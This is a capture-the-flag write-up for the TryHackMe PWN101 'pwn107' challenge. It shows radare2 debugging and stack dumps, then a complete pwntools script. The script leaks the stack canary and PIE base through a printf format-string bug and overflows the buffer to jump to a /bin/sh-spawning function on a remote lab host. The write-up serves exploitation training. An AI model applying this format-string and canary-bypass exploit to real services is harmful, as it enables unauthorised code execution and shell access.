use radare2 to debug and analyze file<br>
<img width="1760" height="447" alt="image" src="https://github.com/user-attachments/assets/78825e37-c90e-4ddd-b3e9-606c28ebef70" />
(base) root@chihuyenich:/mnt/c/daohuyenchi_server/CTF_downloads/tryhackme/PWN101/07-pwn107# r2 -d -A pwn107-1644307530397.pwn107<br>

set some breakpoints like that

<img width="1804" height="982" alt="image" src="https://github.com/user-attachments/assets/08b148af-e63f-46eb-a611-79c5e6007bd5" />

```
[0x76661ec1a540]> db 0x639421600a36
[0x76661ec1a540]> db 0x639421600a3b
[0x76661ec1a540]> dc
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107         

You are a good THM player 😎
But yesterday you lost your streak 🙁
You mailed about this to THM, and they responsed back with some questions
Answer those questions and get your streak back

THM: What's your last streak? %15$lX.%13$lX
Thanks, Happy hacking!!
Your current streak: hit breakpoint at: 0x639421600a36
[0x639421600a36]> dc
76661E82A1CA.B0AF1C83EF60C800
```

use printf vulnunrable (details : [https://www.youtube.com/watch?v=0-ulL3Y0MS8&list=PLchBW5mYosh_F38onTyuhMTt2WGfY-yr7&index=8]<br>
let's see the stack when debbuging by `[0x639421600a3b]> pxr @rsp`<br> 
```
[0x639421600a3b]> pxr @rsp
0x7ffc059d81e0 0x252e586c24353125   %15$lX.% @ rsp ascii ('%')
0x7ffc059d81e8 0x00000a586c243331   13$lX...
0x7ffc059d81f0 ..[ null bytes ]..   00000000 
0x7ffc059d8208 0x000076661ec1baf0   ....fv.. /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 library R X 'endbr64' 'ld-linux-x86-64.so.2'
0x7ffc059d8210 0x00007ffc059d8300   ........ [stack] stack R W 0x639421600780
**0x7ffc059d8218 0xb0af1c83ef60c800   ..`.....**
0x7ffc059d8220 0x00007ffc059d82c0   ........ @ rbp [stack] stack R W 0x7ffc059d8320
0x7ffc059d8228 0x000076661e82a1ca   ....fv.. /usr/lib/x86_64-linux-gnu/libc.so.6 library R X 'mov edi, eax' 'libc.so.6'
0x7ffc059d8230 0x00007ffc059d8270   p....... [stack] stack R W 0x0
0x7ffc059d8238 0x00007ffc059d8348   H....... [stack] rbx stack R W 0x7ffc059d9d7b
0x7ffc059d8240 0x0000000121600040   @.`!.... 4854906944
**0x7ffc059d8248 0x0000639421600992   ..`!.c.. /mnt/c/daohuyenchi_server/CTF_downloads/tryhackme/PWN101/07-pwn107/pwn107-1644307530397.pwn107 .text main,main main program R X 'push rbp' 'pwn107-1644307530397.pwn107'**
0x7ffc059d8250 0x00007ffc059d8348   H....... [stack] rbx stack R W 0x7ffc059d9d7b
0x7ffc059d8258 0xfcf6f7cea4c715a2   ........
0x7ffc059d8260 0x0000000000000001   ........ 1 r12
0x7ffc059d8268 ..[ null bytes ]..   00000000 
0x7ffc059d8278 0x000076661ec33000   .0..fv.. /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 r15 library R W 0x76661ec342e0
0x7ffc059d8280 0xfcf6f7cea52715a2   ..'.....
0x7ffc059d8288 0xefc2c1f0e24515a2   ..E.....
0x7ffc059d8290 0x00007ffc00000000   ........
0x7ffc059d8298 ..[ null bytes ]..   00000000 
0x7ffc059d82a8 0x0000000000000001   ........ 1 r12
0x7ffc059d82b0 ..[ null bytes ]..   00000000 
0x7ffc059d82b8 0xb0af1c83ef60c800   ..`.....
0x7ffc059d82c0 0x00007ffc059d8320    ....... [stack] stack R W 0x0
0x7ffc059d82c8 0x000076661e82a28b   ....fv.. /usr/lib/x86_64-linux-gnu/libc.so.6 library R X 'mov r15, qword [rip + 0x1d8cf6]' 'libc.so.6'
0x7ffc059d82d0 0x00007ffc059d8358   X....... [stack] stack R W 0x7ffc059d9d99
0x7ffc059d82d8 0x000076661ec342e0   .B..fv.. /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 library R W 0x639421600000
```

.text main is a PIE address (it's the start of main function) -> so we can get the dynmamic_main_address and the static address can be found by python library (pwn)<br> 
-> we can find the offset of the binary and we can set the offset too 

<img width="742" height="504" alt="image" src="https://github.com/user-attachments/assets/9baf10b6-a46d-4bb2-a2b1-84e484cdad28" />

there is a sym.get_streak and its use is goto /bin/sh 

<img width="1760" height="447" alt="image" src="https://github.com/user-attachments/assets/6c6018d5-814e-4559-9029-c2df27ef97d5" />

we will use buffer overflow to run this function<br>
this is my solution<br>

```
from pwn import * 

'''
$input + 13 = address of main 
$input + 7 = address of canary  
'''

context.binary = binary = ELF("./pwn107-1644307530397.pwn107")
context.log_level = "debug"

static_main_address = binary.symbols["main"] 

print("Static address of main is : ", hex(static_main_address))

# p = process() 

p = remote("10.49.178.153", 9007)

p.recvuntil(b"streak?")

payload = b"%19$lX.%13$lX"
p.sendline(payload)

p.recvuntil(b"streak: ")
output = p.recv().split(b'\n')[0]
print("After first input : ", output)

dynamic_main_address = int(output.split(b'.')[0].strip(), 16)
print("Dynamic address of main is : ", hex(dynamic_main_address))

canary = int(output.split(b'.')[1].strip(), 16)

# dynamic_address = static_address + base_address
start_offset = dynamic_main_address - static_main_address

binary.address = start_offset # set base_address of binary 
dynamic_get_streak = binary.symbols["get_streak"] # get address of 

# get any ret address by ROP (in pwn library)
_rop = ROP(binary)
ret_gadget = _rop.find_gadget(['ret'])[0]
payload = b'A' * 0x18 + p64(canary) + b'B' * 0x8 + p64(ret_gadget) + p64(dynamic_get_streak)
p.sendline(payload)
print("\n[+] Sended payload !\n")
p.interactive()
```

